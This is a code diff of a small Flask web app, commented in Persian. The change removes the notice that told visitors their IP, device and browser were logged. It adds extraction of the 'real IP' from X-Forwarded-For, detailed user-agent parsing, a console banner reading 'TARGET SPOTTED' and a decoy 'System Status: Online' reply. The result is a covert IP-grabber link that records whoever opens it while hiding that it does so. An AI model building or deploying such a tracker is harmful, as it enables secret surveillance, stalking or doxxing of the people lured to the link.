@@ -1,62 +1,50 @@
 from flask import Flask, request
-import re
 from datetime import datetime
+
+try:
+    from user_agents import parse
+except ImportError:
+    parse = None
 
 app = Flask(__name__)
 
-# فانکشن برای استخراج مدل دستگاه
-def get_device_model(user_agent):
-    if 'Samsung' in user_agent:
-        return 'Samsung'
-    elif 'iPhone' in user_agent:
-        return 'iPhone'
-    elif 'Xiaomi' in user_agent:
-        return 'Xiaomi'
-    else:
-        return 'Other'
-
-# فانکشن برای استخراج نوع مرورگر
-def get_browser_type(user_agent):
-    browsers = {
-        'Chrome': 'Google Chrome',
-        'Firefox': 'Mozilla Firefox',
-        'Safari': 'Apple Safari',
-        'Edge': 'Microsoft Edge',
-        'Opera': 'Opera',
-        'IE': 'Internet Explorer'
-    }
-    for key, value in browsers.items():
-        if key in user_agent:
-            return value
-    return 'Other Browser'
-
 @app.route('/')
 def index():
-    # گرفتن آی‌پی کاربر
-    remote_ip = request.remote_addr
+    # زمان دقیق
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # گرفتن اطلاعات مرورگر (User-Agent)
-    user_agent_string = request.headers.get('User-Agent', 'Unknown')
+    # گرفتن IP واقعی کاربر
+    forwarded_for = request.headers.get('X-Forwarded-For')
+    if forwarded_for:
+        ip = forwarded_for.split(',')[0].strip()
+    else:
+        ip = request.remote_addr
 
-    # استخراج مدل دستگاه و نوع مرورگر
-    device_model = get_device_model(user_agent_string)
-    browser_type = get_browser_type(user_agent_string)
+    # گرفتن User-Agent
+    ua_string = request.headers.get('User-Agent', 'Unknown')
 
-    # زمان فعلی برای ثبت در لاگ
-    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    # مقادیر پیش‌فرض
+    device = "Unknown Device"
+    browser = "Unknown Browser"
 
-    # ساختن پیام لاگ
-    log_message = f"[{current_time}] IP: {remote_ip}, Device: {device_model}, Browser: {browser_type}\n"
+    # اگر کتابخانه نصب بود، اطلاعات دقیق‌تر بده
+    if parse:
+        ua = parse(ua_string)
+        device = f"{ua.device.family} / {ua.os.family} {ua.os.version_string}".strip()
+        browser = f"{ua.browser.family} {ua.browser.version_string}".strip()
+    else:
+        browser = ua_string
 
-    # --- تغییرات اعمال شده ---
-    # لاگ رو به جای فایل، توی کنسول چاپ می‌کنیم
-    print(log_message)
+    # لاگ در کنسول Render
+    print("\n" + "=" * 40)
+    print(f"🚀 TARGET SPOTTED AT: {now}")
+    print(f"🌐 REAL IP: {ip}")
+    print(f"📱 DEVICE: {device}")
+    print(f"🌍 BROWSER: {browser}")
+    print("=" * 40 + "\n")
 
-    # فقط پیام موفقیت رو برمی‌گردونیم
-    return f"Hello! Your info has been logged. IP: {remote_ip}, Device: {device_model}, Browser: {browser_type}"
-    # --- پایان تغییرات ---
+    # پاسخ ساده برای جلوگیری از صفحه سفید
+    return "System Status: Online"
 
 if __name__ == '__main__':
-    # برای اینکه بتونیم از بیرون هم بهش دسترسی داشته باشیم، روی 0.0.0.0 اجرا می‌کنیم
-    # و پورت رو 5000 می‌ذاریم
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=10000)
